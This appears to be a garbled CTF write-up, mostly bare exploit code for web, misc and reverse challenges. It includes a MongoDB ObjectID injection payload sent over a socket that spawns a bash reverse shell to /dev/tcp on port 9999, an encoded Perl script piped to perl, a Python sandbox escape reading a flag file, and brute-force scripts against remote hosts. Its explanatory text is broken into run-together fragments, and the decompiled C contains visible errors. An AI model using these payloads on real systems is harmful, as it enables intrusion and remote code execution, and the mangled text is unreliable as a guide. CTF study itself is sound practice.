        }
    });
db.collection('players').findOne({_id: new ObjectId(id)}
var ObjectID = function ObjectID(id) {
  // Duck-typing to support ObjectId from different npm packages
  if (id instanceof ObjectID) return id;
  if (!(this instanceof ObjectID)) return new ObjectID(id);
  this._bsontype = 'ObjectID';
  // The most common usecase (blank id, new objectId instance)
  if (id == null || typeof id === 'number') {
    // Generate a new id
    this.id = this.generate(id);
    // If we are caching the hex string
    if (ObjectID.cacheHexString) this.__id = this.toString('hex');
    // Return the object
    return;
  }
  // Check if the passed in id is valid
  var valid = ObjectID.isValid(id);
  console.log("pass 1");
  // Throw an error if it's not a valid setup
  if (!valid && id != null) {
    throw new Error(
      'Argument passed in must be a single String of 12 bytes or a string of 24 hex characters'
    );
  } else if (valid && typeof id === 'string' && id.length === 24 && hasBufferType) {
    return new ObjectID(new Buffer(id, 'hex'));
  } else if (valid && typeof id === 'string' && id.length === 24) {
    return ObjectID.createFromHexString(id);
  } else if (id != null && id.length === 12) {
    // assume 12 byte string
    this.id = id;
  } else if (id != null && id.toHexString) {
    // Duck-typing to support ObjectId from different npm packages
    return id;
  } else {
isValid
ObjectID{toHexString:1,id:{length:12}}, 
“id.toHexString”“id.id.length === 12”“id != null && id.toHexString“idnew ObjectID
dataidﬁnd_id
hinthintid
evalc
shell
 python
    throw new Error(
      'Argument passed in must be a single String of 12 bytes or a string of 24 hex characters'
    );
  }
  if (ObjectID.cacheHexString) this.__id = this.toString('hex');
};
ObjectID.isValid = function isValid(id) {
  if (id == null) return false;
  if (typeof id === 'number') {
    return true;
  }
  if (typeof id === 'string') {
    return id.length === 12 || (id.length === 24 && checkForHexRegExp.test(id));
  }
  if (id instanceof ObjectID) {
    return true;
  }
  if (id instanceof _Buffer) {
    return true;
  }
  // Duck-Typing detection of ObjectId like objects
  if (id.toHexString) {
    return id.id.length === 12 || (id.id.length === 24 && checkForHexRegExp.test(id.id));
  }
  return false;
};
Client.socket.emit('init-world',{new:false,id:{"$gt":"a",c:"b",toHexString:1,id:
{length:12}},clientTime:Date.now()})
Client.socket.emit('init-world',{new:false,id:{"$gt":"a","const { execFile, execFileSync } = 
require('child_process');GameServer.server.sendID(socket,execFileSync('/bin/bash' ,['-c' ,'bash -i >& 
/dev/tcp/x.xxx.xx.xx/9999 0>&1']));":"b",toHexString:1,id:{length:12}},clientTime:Date.now()})
//996996
mywebsql
Status: Completed Tags: Web
https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md
shellreadﬂagelfperl
Misc
babyﬂash
Status: Completed Tags: Misc
JPEXS441441=21*21ﬂagﬂag
otaku
Status: Completed Tags: Misc
Wordlastwordgbkcrcknown plaintext attackMy_waifuLSBb1,rgb,lsb,xy ..
text: "*ctf{vI0l3t_Ev3rg@RdeN}\n"
Checkin
Status: Completed Tags: Misc
IRC
She
Status: Completed Tags: Misc
Game Maker XP12113737
629679room4371269213697MD5ﬂag
Sokoban
Status: Completed Tags: Misc
import socket,subprocess,os
p = subprocess.Popen("/readflag", stdin = subprocess.PIPE, stdout = subprocess.PIPE, bufsize = 1)
x = p.stdout.read(100)
print x
w = x.splitlines()[1]
ans = eval(w)
p.stdin.write(str(ans) + '\\n')
v = p.stdout.read(100)
print v
echo 
'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLC
AnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJ
HIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRy
ID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw=='|base64 -d | perl
from pwintools import *
import string
import time
a = 'UuDdLlRr'
b = 'wwssaadd'
gg(
homebrewEvtLoop—
Status: Completed Tags: Misc
t = string.maketrans(a, b)
p = Remote('34.92.121.149', 9091)
p.recvuntil('tips:more than one box\n')
def solve():
    mapp = p.recvuntil('tell')[:-4].replace('8', '#').replace('4', '@').replace('0', ' ').replace('2', 
'$').replace('1', '.').strip()
    print mapp
    open('chall.txt', 'w').write(mapp)
    solver = Process(['YASS.exe', 'chall.txt'])
    time.sleep(0.5)
    optimizer = Process(['YASO.exe', '"chall, YASS 2.141 Solutions.sok"', '-search', 'optimize', '-
optimize', 'moves'])
    # optimizer.wait()
    time.sleep(2)
    f = open('chall, YASS 2.141 Solutions, YASO 2.141 Solutions.sok')
    data = f.read().replace('\n', '')
    f.close()
    # print data
    s = data[data.index("2.141)")+6:]
    print s.translate(t)
    print p.recv(100)
    p.sendline(s.translate(t))
•p.recv(1000)
•p.sendline('dd')
•for i in xrange(24):
     solve()
•p.interactive()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from hashlib import sha1
import string
# context.log_level = 'debug'
table = string.ascii_letters + string.digits
payload = '''[[session[args[0]][{}]][0]in[event[{}]]or[ping_handler][0]][0]or[{}]114514log'''
table = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]"
def proof_of_work(res):
    for a in table:
        for b in table:
            for c in table:
                for d in table:
                    if sha1(a + b + c + d).hexdigest()[:4] == res:
                        return a + b + c + d
homebrewEvtLoop#
Status: Completed Tags: Misc
[[[ping_handler]for[PoW]in[[switch_safe_mode]]]and[[ping_handler]for[raw_input]in[[input]]]and[ping_handler][0]]1145141
eval(compile("print open('ﬂag','rb').read()", '', 'exec'))
Reverse
Matr1x
Status: Completed Tags: Reverse
flag = "*ctf{"
for idx in range(5, 1000):
    success = False
    for guess in table:
        io = remote('34.92.121.149', 54321)
        proof = io.recv().strip().split('==')[1].strip("\" ")
        io.sendline(proof_of_work(proof))
        offset = 64 if idx < 10 else 65
        if guess == '[':
            io.sendline(payload.format(idx, offset - 1, '1'))
        elif guess == ']':
            io.sendline(payload.format(idx, offset + 1, '1'))
        else:
            io.sendline(payload.format(idx, offset, guess))
        res = io.recvuntil('lost')
        io.close()
        if 'exception' in res:
            flag += guess
            success = True
            print idx, flag
             break
    if not success:
        break
print flag
void sub_5C20(int *a1)
{
  _DWORD *result; // eax
  int v2; // [esp+4Ah] [ebp-4h]
  int v3; // [esp+4Ah] [ebp-4h]
  v2 = a1[0];
  a1[0] = a1[6];
  a1[6] = a1[8];
  a1[8] = a1[2];
  a1[2] = v2;
  v3 = a1[1];
  a1[1] = a1[3];
  a1[3] = a1[7];
  a1[7] = a1[5];
  a1[5] = v3;
}
void sub_6473(int *a1)
{
  int result; // eax
  int v2; // [esp+67h] [ebp-4h]
  int v3; // [esp+67h] [ebp-4h]
  v2 = a1[0];
  a1[0] = a1[2];
  a1[2] = a1[8];
  a1[8] = a1[6];
  a1[6] = v2;
  v3 = a1[1];
  a1[1] = a1[5];
  a1[5] = a1[7];
  a1[4] = a1[3];
  a1[3] = v3;
}
void __stdcall operation_16()
{
  int i; // [esp+5Ch] [ebp-8h]
  int v2; // [esp+60h] [ebp-4h]
  for ( i = 0; i < 3; i += 1)
  {
    v2 = mat1[2 + 3 * i];
    mat1[2 + 3 * i] = mat1[47 + 3 * i];
    mat1[47 + 3 * i] = mat1[11 + 3 * i];
    mat1[11 + 3 * i] = mat1[38 + 3 * i];
    mat1[38 + 3 * i] = v2;
  }
  sub_5C20(&mat1[27]);
}
void operation_21()
{
  int i; // [esp+66h] [ebp-8h]
  int v2; // [esp+6Ah] [ebp-4h]
  for ( i = 0; i < 3; i += 1)
  {
    v2 = mat1[2 + 3 * i];
    mat1[2 + 3 * i] = mat1[38 + 3 * i]
    mat1[38 + 3 * i] = mat1[11 + 3 * i];
    mat1[11 + 3 * i] = mat1[47 + 3 * i];
    mat1[47 + 3 * i] = v2;
  }
  sub_6473(&mat1[27]);
}
void operation_17()
{
  signed int i; // [esp+37h] [ebp-8h]
  int v2; // [esp+3Bh] [ebp-4h]
  for ( i = 0; i < 3; i += 1)
  {
    v2 = mat1[3 * i];
    mat1[3 * i] = mat1[4 + 3 * i];
    mat1[4 + 3 * i] = mat1[1 + 3 * i];
    mat1[1 + 3 * i] = mat1[5 + 3 * i];
    mat1[5 + 3 * i] = v2;
  }
  sub_5C20(&mat1[18]);
}
void operation_20()
{
  int i; // [esp+3Ah] [ebp-8h]
  int v2; // [esp+3Eh] [ebp-4h]
  for ( i = 0; i < 3; i += 1 )
  {
    v2 = mat1[3 * i];
    mat1[3 * i] = mat1[45 + 3 * i];
    mat1[45 + 3 * i] = mat1[9 + 3 * i];
    mat1[9 + 3 * i] = mat1[36 + 3 * i];
    mat1[36 + 3 * i] = v2;
  }
  sub_6473(&mat1[18]);
}
void operation_18()
{
  int result; // eax
  int i; // [esp+31h] [ebp-8h]
  int v2; // [esp+35h] [ebp-4h]
  for ( i = 0; i < 3; i += 1 )
  {
    v2 = mat[1 + 3 * i];
    mat[1 + 3 * i] = mat1[46 + 3 * i];
    mat1[46 + 3 * i] = mat1[10 + 3 * i];
    mat1[10 + 3 * i] = mat1[37 + 3 * i];
    mat1[37 + 3 * i] = v2;